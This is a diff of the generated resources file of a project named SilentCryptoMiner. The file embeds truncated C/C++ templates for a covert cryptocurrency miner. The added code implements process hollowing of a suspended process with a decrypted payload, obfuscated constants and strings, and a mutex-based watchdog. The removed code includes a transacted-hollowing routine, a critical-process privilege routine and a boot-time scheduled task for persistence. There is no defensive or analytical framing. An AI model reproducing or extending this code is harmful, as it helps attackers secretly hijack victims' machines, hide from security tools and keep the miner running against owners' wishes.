@@ -97,13 +97,17 @@ namespace SilentCryptoMiner.Properties {
         ///#include &quot;ntddk.h&quot;
         ///#include &quot;obfuscateu.h&quot;
         ///
-        ///void init_unicode_string(PUNICODE_STRING target_string, wchar_t* source_string, SIZE_T length) {
-        ///    target_string-&gt;MaximumLength = (USHORT)(length * sizeof(WCHAR) + 1);
-        ///    target_string-&gt;Length  = (USHORT)(wcslen(source_string) * sizeof(WCHAR));
-        ///    target_string-&gt;Buffer = source_string;
+        ///UNICODE_STRING init_unicode_string(wchar_t* source_string) {
+        ///    UNICODE_STRING result = { 0 };
+        ///    result.MaximumLength = (USHORT)(wcslen(source_string) * AYU_OBFC(sizeof(WCHAR)) + AYU_OBFC(sizeof(WCHAR)));
+        ///    result.Length = result.MaximumLength - AYU_OBFC(sizeof(WCHAR));
+        ///    result.Buffer = source_string;
+        ///    return result;
         ///}
         ///
-        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, D [rest of string was truncated]&quot;;.
+        ///#define INITIALIZE_NT_OBJECT_ATTRIBUTES(path) \
+        ///    wchar_t ntPath[MAX_PATH + 4] = { 0 }; \
+        ///    com [rest of string was truncated]&quot;;.
         /// </summary>
         public static string common_cpp {
             get {
@@ -116,17 +120,17 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///#include &quot;ntddk.h&quot;
         ///
-        ///void init_unicode_string(PUNICODE_STRING target_string, wchar_t* source_string, SIZE_T length);
+        ///UNICODE_STRING init_unicode_string(wchar_t* source_string);
         ///
         ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags);
         ///
         ///bool has_gpu();
         ///
-        ///void format_string(wchar_t* dest, const wchar_t* format, va_list args);
-        ///
         ///void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...);
         ///
-        ///void cipher(unsigned  [rest of string was truncated]&quot;;.
+        ///unsigned char* resource_decrypt(unsigned char* data, size_t in_len, size_t* out_len);
+        ///
+        ///void resource_free(void* ptr, size_t size); [rest of string was truncated]&quot;;.
         /// </summary>
         public static string common_h {
             get {
@@ -140,16 +144,6 @@ namespace SilentCryptoMiner.Properties {
         public static byte[] Compilers {
             get {
                 object obj = ResourceManager.GetObject("Compilers", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] ddb64 {
-            get {
-                object obj = ResourceManager.GetObject("ddb64", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -209,24 +203,14 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///#include &quot;ntddk.h&quot;
         ///#include &quot;common.h&quot;
+        ///#include &quot;obfuscateu.h&quot;
         ///
-        ///BYTE* get_nt_hrds(const BYTE* pe_buffer)
+        ///#define CHECK_STATUS_AND_CLEANUP(status) { if(!NT_SUCCESS(status)) { UtTerminateProcess(pi.hProcess, 0); return INVALID_HANDLE_VALUE; } }
+        ///
+        ///HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir)
         ///{
-        ///    if (pe_buffer == NULL) return NULL;
-        ///
-        ///    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
-        ///    if (idh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
-        ///        return NULL;
-        ///    }
-        ///    LONG pe_offset = idh-&gt;e_lfanew;
-        ///
-        ///    if (pe_offset &gt; 1024) return NULL;
-        ///
-        ///    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
-        ///    if (inh-&gt;Signature != IMAGE_NT_SIGNATURE) {
-        ///        return NULL;
-        ///    }
-        ///    re [rest of string was truncated]&quot;;.
+        ///    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED));
+        ///    if ( [rest of string was truncated]&quot;;.
         /// </summary>
         public static string inject_cpp {
             get {
@@ -239,7 +223,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///#include &lt;windows.h&gt;
         ///
-        ///HANDLE transacted_hollowing(wchar_t* tmpFile, wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payladBuf, DWORD payloadSize, wchar_t* startDir);.
+        ///HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir);.
         /// </summary>
         public static string inject_h {
             get {
@@ -283,26 +267,17 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
+        ///   Looks up a localized string similar to #include &quot;ntddk.h&quot;
         ///
-        ///#include &quot;UFiles\common.h&quot;
-        ///#include &quot;UFiles\obfuscateu.h&quot;
-        ///#include &quot;UFiles\inject.h&quot;
+        ///#include &quot;common.h&quot;
+        ///#include &quot;obfuscateu.h&quot;
+        ///#include &quot;inject.h&quot;
         ///
-        ///$GLOBALRESOURCES
-        ///$RESOURCES
-        ///
-        ///#if DefProcessProtect
-        ///bool bl = false;
-        ///
-        ///void set_critical_process(HANDLE pHandle) {
-        ///    if (!bl) {
-        ///        TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };
-        ///
-        ///        HANDLE hToken = NULL;
-        ///	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
-        ///
-        ///        bl = NT_SUCCESS(UtAdjustPrivilegesToken( [rest of string was truncated]&quot;;.
+        ///void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
+        ///    if (!check_mutex(mutex)) {
+        ///        size_t out_len;
+        ///        unsigned char* payloadDecryped = resource_decrypt(payload, payloadSize, &amp;out_len);
+        ///        HANDLE pHandle = process_hollowing(programPath, cmdLine, runtimeData, payloadDecryped, star [rest of string was truncated]&quot;;.
         /// </summary>
         public static string miner {
             get {
@@ -393,7 +368,6 @@ namespace SilentCryptoMiner.Properties {
         ///   Looks up a localized string similar to #ifdef DefIcon
         ///1 ICON &quot;#ICON&quot;
         ///#endif
-        ///1 24 &quot;program.manifest&quot;
         ///#ifdef DefAssembly
         ///1 VERSIONINFO
         ///FILEVERSION     #VERSION
@@ -409,7 +383,7 @@ namespace SilentCryptoMiner.Properties {
         ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
         ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
-        ///        [rest of string was truncated]&quot;;.
+        ///            VALUE &quot;ProductName&quot;, [rest of string was truncated]&quot;;.
         /// </summary>
         public static string resource {
             get {
@@ -428,43 +402,16 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
-        ///&lt;Task version=&quot;1.3&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
-        ///  &lt;Triggers&gt;
-        ///    &lt;BootTrigger&gt;
-        ///  	  &lt;Enabled&gt;true&lt;/Enabled&gt;
-        ///    &lt;/BootTrigger&gt;
-        ///  &lt;/Triggers&gt;
-        ///  &lt;Principals&gt;
-        ///    &lt;Principal id=&quot;Author&quot;&gt;
-        ///	  &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
-        ///    &lt;/Principal&gt;
-        ///  &lt;/Principals&gt;
-        ///  &lt;Settings&gt;
-        ///    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
-        ///    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
-        ///    &lt;StopIfGoingOnB [rest of string was truncated]&quot;;.
-        /// </summary>
-        public static string TaskTemplate {
-            get {
-                return ResourceManager.GetString("TaskTemplate", resourceCulture);
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
         ///&lt;assembly xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; manifestVersion=&quot;1.0&quot;&gt;
         ///  &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
         ///    &lt;security&gt;
         ///      &lt;requestedPrivileges&gt;
-        ///        &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot;/&gt;
+        ///        &lt;requestedExecutionLevel level=&quot;#MANIFESTLEVEL&quot; uiAccess=&quot;false&quot;&gt;&lt;/requestedExecutionLevel&gt;
         ///      &lt;/requestedPrivileges&gt;
         ///    &lt;/security&gt;
         ///  &lt;/trustInfo&gt;
-        ///  &lt;compatibility xmlns=&quot;urn:schemas-microsoft-com:compatibility.v1&quot;&gt;
-        ///    &lt;application&gt;
-        ///      &lt;supportedOS Id=&quot;{e2011457-1546-43c5-a5fe-008deee3d3f0}&quot;/&gt;
-        ///      &lt;support [rest of string was truncated]&quot;;.
+        ///&lt;/assembly&gt;.
         /// </summary>
         public static string template {
             get {
@@ -502,7 +449,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///public partial class _rUninstaller_
         ///{
-        ///    private static string li [rest of string was truncated]&quot;;.
+        ///    private static void Main [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Uninstaller {
             get {
@@ -511,28 +458,25 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
+        ///   Looks up a localized string similar to #include &quot;ntddk.h&quot;
         ///
-        ///#include &quot;UFiles\common.h&quot;
-        ///#include &quot;UFiles\obfuscateu.h&quot;
-        ///
-        ///$GLOBALRESOURCES
+        ///#include &quot;common.h&quot;
+        ///#include &quot;obfuscateu.h&quot;
         ///
         ///int main(int argc, char *argv[])
         ///{
+        ///    UNICODE_STRING ustring = init_unicode_string(AYU_OBFW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;));
+        ///    OBJECT_ATTRIBUTES attr = { 0 };
+        ///    InitializeObjectAttributes(&amp;attr, &amp;ustring, 0, NULL, NULL);
+        ///
         ///    HANDLE hMutex;
-        ///
-        ///    UNICODE_STRING umutex;
-        ///    init_unicode_string(&amp;umutex, AYU_OBFUSCATEW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;), MAX_PATH);
-        ///
-        ///    OBJECT_ATTRIBUTES attr;
-        ///    InitializeObjectAttributes(&amp;attr, &amp;umutex, 0, NULL, NULL);
-        ///
-        ///    if (!NT_SUCCESS(UtCreateMutant(&amp;hMutex, MUTANT_ALL_ACCESS, &amp;attr, TRUE))) {
+        ///    if (!NT_SUCCESS(UtCreateMutant(&amp;hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &amp;attr, TRUE))) {
         ///        return 0;
         ///    }
         ///
-        ///    bool is [rest of string was truncated]&quot;;.
+        ///    bool isAdmin = check_administrator();
+        ///
+        ///    PUT_PEB_EXT peb  [rest of string was truncated]&quot;;.
         /// </summary>
         public static string watchdog {
             get {
